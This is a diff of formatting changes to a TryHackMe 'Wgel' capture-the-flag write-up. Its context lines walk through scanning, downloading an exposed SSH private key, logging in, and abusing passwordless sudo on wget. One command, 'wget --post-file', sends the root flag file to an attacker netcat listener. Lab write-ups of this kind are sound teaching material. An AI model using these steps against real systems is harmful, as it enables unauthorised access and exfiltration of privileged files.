@@ -5,12 +5,15 @@
 - [References](#references)
 
 ## Room information
-```
+
+```text
+Type: Challenge
 Difficulty: Easy
 OS: Linux
 Subscription type: Free
 Description: Can you exfiltrate the root flag?
 ```
+
 Room link: [https://tryhackme.com/r/room/wgelctf](https://tryhackme.com/r/room/wgelctf)
 
 ## Solution
@@ -18,6 +21,7 @@ Room link: [https://tryhackme.com/r/room/wgelctf](https://tryhackme.com/r/room/w
 ### Check for services with nmap
 
 We start by scanning the machine with `nmap`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Wgel_CTF]
 └─$ nmap -v -sV -sC 10.10.84.138 
@@ -77,7 +81,9 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.45 seconds
 ```
+
 We have two services running:
+
 - OpenSSH 7.2p2 on port 22
 - Apache httpd 2.4.18 on port 80
 
@@ -85,13 +91,15 @@ We have two services running:
 
 Manually browsing to port 80 shows a `Apache2 Ubuntu Default Page`.  
 On the page we find this comment
-```
+
+```text
  <!-- Jessie don't forget to udate the webiste -->
 ```
 
 ### Check for files/directories with gobuster
 
 Next, we check for files/directories on the web service with `gobuster`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Wgel_CTF]
 └─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x html,php,txt -u http://10.10.84.138 
@@ -132,7 +140,9 @@ Progress: 18456 / 18460 (99.98%)
 Finished
 ===============================================================
 ```
+
 Let's continue scanning the `/sitemap` directory
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Wgel_CTF]
 └─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x html,php,txt -u http://10.10.84.138/sitemap                 
@@ -190,7 +200,8 @@ Manually browsing to `http://10.10.84.138/sitemap/.ssh/` shows a directory listi
 ![Directory listing on Wgel machine](Images/Directory_listing_on_Wgel_machine.png)
 
 Let's assume the private SSH key belongs to the `jessie` user and download it
-```bash          
+
+```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Wgel_CTF]
 └─$ curl http://10.10.84.138/sitemap/.ssh/id_rsa -o jessie_id_rsa                                      
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -201,6 +212,7 @@ Let's assume the private SSH key belongs to the `jessie` user and download it
 ### Login with SSH as jessie
 
 Now we ought to be able to login with SSH as `jessie`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Wgel_CTF]
 └─$ chmod 600 jessie_id_rsa                                      
@@ -224,11 +236,13 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)
 
 jessie@CorpOne:~$ 
 ```
+
 And we are in.
 
 ### Get the user flag
 
 Next, we can search for the user flag with `find`
+
 ```bash
 jessie@CorpOne:~$ find . -type f -name [Uu]ser* 2>/dev/null
 ./.local/share/keyrings/user.keystore
@@ -244,6 +258,7 @@ jessie@CorpOne:~$ cat Documents/user_flag.txt
 
 We now start enumerating for ways to escalate our privileges.  
 First we check if we can run any commands as root via `sudo`
+
 ```bash
 jessie@CorpOne:~$ sudo -l
 Matching Defaults entries for jessie on CorpOne:
@@ -253,11 +268,13 @@ User jessie may run the following commands on CorpOne:
     (ALL : ALL) ALL
     (root) NOPASSWD: /usr/bin/wget
 ```
+
 We can execute `/usr/bin/wget`.
 
 ### Get the root flag
 
 We will POST the flag to our local machine so we start a netcat listener
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Wgel_CTF]
 └─$ nc -lvnp 12345                                                  
@@ -266,6 +283,7 @@ listening on [any] 12345 ...
 ```
 
 The we transfer the root flag
+
 ```bash
 jessie@CorpOne:~$ sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.14.61.233:12345
 --2024-09-18 17:06:38--  http://10.14.61.233:12345/
@@ -274,6 +292,7 @@ HTTP request sent, awaiting response...
 ```
 
 Back at the netcat listener we end the connection with `CTRL + C`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Wgel_CTF]
 └─$ nc -lvnp 12345                                                  
@@ -291,6 +310,7 @@ Content-Length: 33
 b<REDACTED>d
 ^C
 ```
+
 And there we have the flag!
 
 For additional information, please see the references below.
